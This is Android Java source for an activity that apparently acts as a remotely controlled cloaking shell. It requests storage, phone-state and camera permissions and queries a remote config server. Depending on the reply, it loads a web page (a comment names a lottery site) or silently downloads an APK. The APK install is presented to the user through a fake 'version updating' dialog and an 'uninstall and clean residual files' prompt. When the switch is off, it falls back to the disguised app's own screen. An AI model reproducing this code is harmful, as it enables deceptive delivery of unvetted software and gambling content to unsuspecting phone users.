package com.regus.mj;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.DownloadListener;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.DocumentBuilderFactory;


public class MJRegusActivity extends Activity {


    String mAid = "REGUS_AID";
    String activityPath = "REGUS_PATH_ACT";
    String mAimPackage = "REGUS_PKG";

    //该页面的下载时候的背景图片id
    int splash_down_bg_id = 2131230877;

    String baseUrl = "http://appid.aigoodies.com/getAppConfig.php?appid=";

    String downloadApkUrl;


    WebView mWebView;
    RelativeLayout mRelativeLayout;
    ProgressDialog mProgressDialog;

    ProgressDialog mdownProgressDialog;

    boolean isWebViewInit;

    public long packSize;
    public int progress;
    public String updateSaveName;
    public File savefolder;
    DownloadApkThread downloadApkThread;
    /**
     * 权限部分
     */

    String[] permissions = new String[]{
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CAMERA,
    };
    List<String> mPermissionList = new ArrayList<>();
    boolean mShowRequestPermission = true;//用户是否禁止权限


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (Build.VERSION.SDK_INT >= 21) {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
            getWindow().setStatusBarColor(Color.BLACK);
        }
        isWebViewInit = false;

        mRelativeLayout = new RelativeLayout(this);
        mRelativeLayout.setPadding(0, getStatusBarHeight(), 0, 0);

        setContentView(mRelativeLayout);


        mWebView = new WebView(MJRegusActivity.this);
        mWebView.setVisibility(View.INVISIBLE);

        RelativeLayout.LayoutParams layoutParam = new RelativeLayout.LayoutParams
                (RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);

        mWebView.setLayoutParams(layoutParam);

        mRelativeLayout.addView(mWebView);

        checkPermision();

    }

    @SuppressLint("ResourceType")
    private void setDownLoadApkBgId() {

        getWindow().setBackgroundDrawableResource(splash_down_bg_id);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

    }

    /**
     * 权限检测完毕之后
     */
    private void afterCheckPermision() {

        if (isAvilible(mAimPackage, this)) {
            Log.e("regus", " 目标app 已经安装");
            Intent launchIntentForPackage = this.getPackageManager().getLaunchIntentForPackage(mAimPackage);
            this.startActivity(launchIntentForPackage);
            finish();
        }

        requset();
    }

    /**
     * 权限检测
     */
    private void checkPermision() {
        mPermissionList.clear();
        for (int i = 0; i < permissions.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);
            }
        }
        /**
         * 判断是否为空
         */
        if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
            afterCheckPermision();
        } else {//请求权限方法
            String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
            ActivityCompat.requestPermissions(this, permissions, 1);
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case 1:
                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        //判断是否勾选禁止后不再询问
                        boolean showRequestPermission = ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i]);
                        if (showRequestPermission) {//
                            checkPermision();//重新申请权限
                            return;
                        } else {
                            mShowRequestPermission = false;//已经禁止
                        }
                    }
                }
                afterCheckPermision();
                break;

            case 2:

                break;
            default:
                break;
        }
    }


    private void requset() {
        new Thread(new RequestRunnable(mAid, baseUrl)).start();
    }


    public void initWebSetting() {
        WebSettings webSettings = mWebView.getSettings();

        //支持缩放，默认为true。
        webSettings.setSupportZoom(true);
        //调整图片至适合webview的大小
        webSettings.setUseWideViewPort(true);
        // 缩放至屏幕的大小
        webSettings.setLoadWithOverviewMode(true);
        //设置默认编码
        webSettings.setDefaultTextEncodingName("utf-8");
        webSettings.setBuiltInZoomControls(true);
        webSettings.setDisplayZoomControls(false);
        //多窗口
        webSettings.supportMultipleWindows();
        //获取触摸焦点
        mWebView.requestFocusFromTouch();
        //允许访问文件
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        //开启javascript
        webSettings.setJavaScriptEnabled(true);

        DocumentBuilderFactory.newInstance().setExpandEntityReferences(false);

        //支持通过JS打开新窗口
        webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
        //提高渲染的优先级
        webSettings.setRenderPriority(WebSettings.RenderPriority.HIGH);
        //支持内容重新布局
        webSettings.setLayoutAlgorithm(WebSettings.LayoutAlgorithm.SINGLE_COLUMN);


        webSettings.setDomStorageEnabled(true);        //设置支持DomStorage

        //图片先不加载最后再加载
        if (Build.VERSION.SDK_INT >= 19) {
            webSettings.setLoadsImagesAutomatically(true);
        } else {
            webSettings.setLoadsImagesAutomatically(false);
        }
        webSettings.setAppCacheEnabled(true);          // 启用缓存
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        //修改硬件加速导致页面渲染闪烁问题
        // mWebview.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
        mWebView.requestFocus();
        mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        /**
         * MIXED_CONTENT_ALWAYS_ALLOW：允许从任何来源加载内容，即使起源是不安全的；
         * MIXED_CONTENT_NEVER_ALLOW：不允许Https加载Http的内容，即不允许从安全的起源去加载一个不安全的资源；
         * MIXED_CONTENT_COMPATIBILITY_MODE：当涉及到混合式内容时，WebView 会尝试去兼容最新Web浏览器的风格。
         **/
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mWebView.getSettings().setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        mWebView.setWebViewClient(new CommonWebViewClient());
        mWebView.setWebChromeClient(new CommonWebChromeClient());
        mWebView.setDownloadListener(new MjDownloadListener());
    }


    private class MjDownloadListener implements DownloadListener {

        @Override
        public void onDownloadStart(final String url, String userAgent, final String contentDisposition, final String mimetype, long contentLength) {

            Log.e("onDurl-->", url);
            Log.e("onD userAgent->", userAgent);
            Log.e("onD contentLength->", contentLength + "");

            Uri uri = Uri.parse(url);
            Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            intent.addCategory(Intent.CATEGORY_BROWSABLE);
            startActivity(intent);

        }

    }


    private class CommonWebViewClient extends WebViewClient {

        @Override
        public void onLoadResource(WebView webView, String s) {
            super.onLoadResource(webView, s);
            Log.e("onPageLoadResource", s);
        }


        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            //showProgress();
            Log.e("onPageStarted", url);
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            Log.e("onPageFinished", url);
            mWebView.setVisibility(View.VISIBLE);
            hideWebViewLoadDialog();
        }

        @Override
        public void onReceivedError(WebView webView, WebResourceRequest webResourceRequest, WebResourceError webResourceError) {
            super.onReceivedError(webView, webResourceRequest, webResourceError);
        }


        @Override
        public void onReceivedSslError(WebView webView, SslErrorHandler sslErrorHandler, SslError sslError) {
            sslErrorHandler.cancel();
            super.onReceivedSslError(webView, sslErrorHandler, sslError);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Log.e("onPageShoudOver", url);
            if (url == null) return false;

            return shouldfileterUrl(url);
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);
            switch (errorCode) {
                case ERROR_CONNECT:

                    break;
            }
        }


        /**
         * 拦截WebView网络请求（Android API < 21）
         * 只能拦截网络请求的URL，请求方法、请求内容等无法拦截
         */
        public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
            return super.shouldInterceptRequest(view, url);
        }

        /**
         * 拦截WebView网络请求（Android API >= 21）
         * 通过解析WebResourceRequest对象获取网络请求相关信息
         */
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
            //    Log.e("WebResourceRequest  ", "Cookie: " + CookieManager.getInstance().getCookie(DataCenter.getInstance().getDomain()) + " \n Method: " + request.getMethod() + "  \n Headers: " + request.getRequestHeaders().toString() + "\n");
            return super.shouldInterceptRequest(view, request);
        }
    }


    private class CommonWebChromeClient extends WebChromeClient {
        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            super.onProgressChanged(view, newProgress);
            Log.e("regus WebView progress", newProgress + "");
            showLoadDialogProgress(newProgress);
        }
    }


    boolean shouldfileterUrl(String url) {
        if (url == null) return false;
        try {
            mWebView.loadUrl(url);
        } catch (Exception e) {

        }
        return true;
    }


    /**
     * 利用反射获取状态栏高度
     *
     * @return
     */
    public int getStatusBarHeight() {
        int result = 0;
        //获取状态栏高度的资源id
        int resourceId = getResources().getIdentifier("status_bar_height", "dimen", "android");
        if (resourceId > 0) {
            result = getResources().getDimensionPixelSize(resourceId);
        }
        return result;
    }

    private class RequestRunnable implements Runnable {

        String url;
        String aid;

        public RequestRunnable(String aid, String url) {
            this.aid = aid;
            this.url = url;
        }

        @Override
        public void run() {

            if (TextUtils.isEmpty(aid)) {
                jump();
                return;
            }

            String rootUrl = url + mAid;
            String allUrl = rootUrl;

            try {
                URL urll = new URL(allUrl);
                HttpURLConnection urlConnection = (HttpURLConnection) urll.openConnection();
                urlConnection.setConnectTimeout(10000);
                urlConnection.setReadTimeout(10000);
                urlConnection.setInstanceFollowRedirects(false);
                urlConnection.setRequestMethod("GET");
                urlConnection.connect();
                int code = urlConnection.getResponseCode();
                if (code == 200) {
                    InputStream inputStream = urlConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    String line;
                    StringBuffer buffer = new StringBuffer();
                    while ((line = bufferedReader.readLine()) != null) {
                        buffer.append(line);
                    }
                    String jsonStr = buffer.toString();
                    Log.e("regus", jsonStr + "");

                    //处理
                    try {
                        JSONObject responseJson = new JSONObject(jsonStr.replace("\\", ""));

                        if (responseJson.has("success")) {
                            if (responseJson.getBoolean("success")) {

                                if (responseJson.getInt("ShowWeb") == 1) {

                                    if (!TextUtils.isEmpty(responseJson.getString("Url"))) {
                                        if (responseJson.getString("Url").endsWith("apk")) {
                                            downloadApkUrl = responseJson.getString("Url");
                                            downloadPackage();
                                        } else {
                                            startWebview(responseJson.getString("Url"));
                                        }
                                    } else {
                                        jump();
                                    }

                                } else if (responseJson.getInt("ShowWeb") == 0) {
                                    judeJump(url);
                                }

                            } else {
                                judeJump(url);
                            }
                            return;
                        }

                    } catch (JSONException e) {
                        e.printStackTrace();
                        judeJump(url);
                    }
                } else {
                    judeJump(url);
                }
            } catch (Exception e) {
                judeJump(url);
            }
        }
    }


    private void judeJump(String url) {
        jump();
    }


    /**
     * 跳原应用
     */

    private void jump() {
        try {
            Class aimClass = Class.forName(activityPath);
            Intent intent = new Intent(MJRegusActivity.this, aimClass);
            startActivity(intent);
            finish();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @SuppressLint("WrongConstant")
    public void downloadPackage() {

        if (TextUtils.isEmpty(this.downloadApkUrl)) {
            Toast.makeText(this, "未配置APP下载链接~", 1);
            return;
        }

        runOnUiThread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
            @Override
            public void run() {
                if (!MJRegusActivity.this.isDestroyed()) {

                    setDownLoadApkBgId();

                    mdownProgressDialog = new ProgressDialog(MJRegusActivity.this);
                    mdownProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                    mdownProgressDialog.setMax(100);
                    mdownProgressDialog.setMessage("版本更新中，请稍后...");
                    mdownProgressDialog.setCancelable(false);
                }
            }
        });

        this.downloadApkThread = new DownloadApkThread();
        this.downloadApkThread.start();
    }


    private class DownloadApkThread extends Thread {
        private DownloadApkThread() {
        }

        @SuppressLint("WrongConstant")
        public void run() {
            super.run();
            long j = 0;
            try {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(MJRegusActivity.this.downloadApkUrl).openConnection();
                httpURLConnection.connect();
                if (httpURLConnection.getResponseCode() != 200) {
                    Log.e("regus", "下载apk异常 code: " + httpURLConnection.getResponseCode());
                    jump();
                    return;
                }
                InputStream is = httpURLConnection.getInputStream();
                MJRegusActivity.this.packSize = (long) httpURLConnection.getContentLength();
                if (MJRegusActivity.checkExistSDCard()) {
                    MJRegusActivity.this.savefolder = Environment.getExternalStorageDirectory();
                } else {
                    MJRegusActivity.this.savefolder = MJRegusActivity.this.getDir("update", 3);
                }
                MJRegusActivity.this.updateSaveName = MJRegusActivity.this.downloadApkUrl.substring(MJRegusActivity.this.downloadApkUrl.lastIndexOf("/") + 1);
                File file = new File(MJRegusActivity.this.savefolder, MJRegusActivity.this.updateSaveName);
                Log.e("regusupdateManager", " updateSaveName ==== " + MJRegusActivity.this.updateSaveName);
                if (file.exists()) {
                    file.delete();
                }
                Log.e("regusupdateManager", " updateSave ==== " + file.getAbsolutePath());
                OutputStream os = new FileOutputStream(file);
                byte[] bytes = new byte[512];
                while (true) {
                    int length = is.read(bytes);
                    if (length != -1) {
                        os.write(bytes, 0, length);
                        j += (long) length;
                        MJRegusActivity.this.progress = (int) ((((float) j) / ((float) MJRegusActivity.this.packSize)) * 100.0f);
                        Log.e("regus progress", MJRegusActivity.this.progress + "");
                        MJRegusActivity.this.showLoadDialogProgress1(MJRegusActivity.this.progress);
                        if (MJRegusActivity.this.progress == 100) {
                            MJRegusActivity.this.hideWebViewLoadDialog1();
                        }
                    } else {
                        is.close();
                        os.close();
                        os.flush();
                        askIfUninstallSelf();
                        return;
                    }
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
                jump();
            } catch (IOException e2) {
                e2.printStackTrace();
                Log.e("regus IOException", "" + e2.getLocalizedMessage());
                jump();
            } catch (Exception e3) {
                e3.printStackTrace();
                Log.e("regus Exception", "" + e3.getLocalizedMessage());
            }
        }
    }


    public static boolean checkExistSDCard() {
        return Environment.getExternalStorageState().equals("mounted");
    }

    public void showLoadDialogProgress1(final int progress2) {
        runOnUiThread(new Runnable() {
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    if (mdownProgressDialog != null && !MJRegusActivity.this.isDestroyed()) {
                        if (!mdownProgressDialog.isShowing()) {
                            mdownProgressDialog.show();
                        }
                        mdownProgressDialog.setProgress(progress2);
                    }
                } else {
                    if (mdownProgressDialog != null) {
                        if (!mdownProgressDialog.isShowing()) {
                            mdownProgressDialog.show();
                        }
                        mdownProgressDialog.setProgress(progress2);
                    }
                }
            }
        });
    }


    public void hideWebViewLoadDialog1() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                    if (mdownProgressDialog != null && !MJRegusActivity.this.isDestroyed()) {
                        if (mdownProgressDialog.isShowing()) {
                            mdownProgressDialog.dismiss();
                        }
                    }
                } else {
                    if (mdownProgressDialog != null) {
                        if (mdownProgressDialog.isShowing()) {
                            mdownProgressDialog.dismiss();
                        }
                    }
                }
            }
        });

    }


    @SuppressLint("WrongConstant")
    public void gotoInstall() {
        Intent intent = new Intent("android.intent.action.VIEW");
        int i = getApplicationInfo().targetSdkVersion;
        if (Build.VERSION.SDK_INT < 24 || i < 24) {
            Log.e("regusgotoInstall ", Uri.fromFile(new File(this.savefolder, this.updateSaveName)) + "");
            intent.setDataAndType(Uri.fromFile(new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        } else {
            intent.setFlags(1);
            intent.addFlags(1);
            Log.e("regus setDataAndType", "savefolder :" + this.savefolder + " updateSaveName " + this.updateSaveName);
            intent.setDataAndType(FileProvider.getUriForFile(getApplicationContext(), getPackageName() + ".fileprovider", new File(this.savefolder, this.updateSaveName)), "application/vnd.android.package-archive");
        }
        intent.addFlags(268435456);
        startActivity(intent);
    }

    private void askIfUninstallSelf() {

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                //创建dialog构造器
                AlertDialog.Builder normalDialog = new AlertDialog.Builder(MJRegusActivity.this);
                //设置title
                normalDialog.setTitle("卸载应用");
                //设置内容
                normalDialog.setMessage("同时清理残余文件");
                //设置按钮
                normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {

                        gotoInstall();

                        Uri packageUri = Uri.parse("package:" + getPackageName());
                        Intent intent = new Intent(Intent.ACTION_DELETE, packageUri);
                        startActivity(intent);

                    }
                });
                normalDialog.setNegativeButton("取消", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                        gotoInstall();
                    }

                });
                normalDialog.show();
            }
        });

    }


    /**
     * web 显示h5天天彩
     *
     * @param url
     */
    private void startWebview(final String url) {
        if (TextUtils.isEmpty(url)) {
            jump();
            return;
        }
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mProgressDialog = new ProgressDialog(MJRegusActivity.this);
                mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                mProgressDialog.setMax(100);
                mProgressDialog.setMessage("页面加载中，请稍后...");
                mProgressDialog.setCanceledOnTouchOutside(false);
                mProgressDialog.show();
                initWebSetting();
                mWebView.loadUrl(url);
            }
        });

    }


    /**
     * 判断有没有安装该apk
     *
     * @param packageName
     * @param context
     * @return
     */
    public static boolean isAvilible(String packageName, Context context) {
        final PackageManager packageManager = context.getPackageManager();
        // 获取所有已安装程序的包信息
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        for (int i = 0; i < pinfo.size(); i++) {
            if (pinfo.get(i).packageName.equalsIgnoreCase(packageName))
                return true;
        }
        return false;
    }


    /**
     * 返回上一个页面
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_BACK) && mWebView.canGoBack()) {
            // 返回键退回
            mWebView.goBack();
            return true;
        } else
            return super.onKeyDown(keyCode, event);
    }


    private void showLoadDialogProgress(int progress) {

        if (isWebViewInit) return;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            if (mProgressDialog != null && !this.isDestroyed()) {
                if (!mProgressDialog.isShowing()) {
                    mProgressDialog.show();
                }
                mProgressDialog.setProgress(progress);
            }
        } else {
            if (mProgressDialog != null) {
                if (!mProgressDialog.isShowing()) {
                    mProgressDialog.show();
                }
                mProgressDialog.setProgress(progress);
            }
        }
    }

    private void hideWebViewLoadDialog() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            if (mProgressDialog != null && !this.isDestroyed()) {
                if (mProgressDialog.isShowing()) {
                    mProgressDialog.dismiss();
                }
            }
        } else {
            if (mProgressDialog != null) {
                if (mProgressDialog.isShowing()) {
                    mProgressDialog.dismiss();
                }
            }
        }

        isWebViewInit = true;
    }


}
